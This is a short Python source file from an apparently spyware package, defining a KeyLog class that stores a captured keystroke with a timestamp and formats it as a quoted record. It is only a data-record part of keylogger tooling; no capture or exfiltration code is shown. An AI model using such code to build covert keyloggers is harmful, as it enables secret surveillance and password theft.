from spyware.logs.log import Log

class KeyLog(Log):
    def __init__(self, key: str) -> None:
        super().__init__()

        self.key = key

    def __repr__(self) -> str:
        return f"'{ self.key }'," + \
            f"'{ self.day }'," + \
            f"'{ self.month }'," + \
            f"'{ self.year }'," + \
            f"'{ self.hour }'," + \
            f"'{ self.minute }'," + \
            f"'{ self.second }'"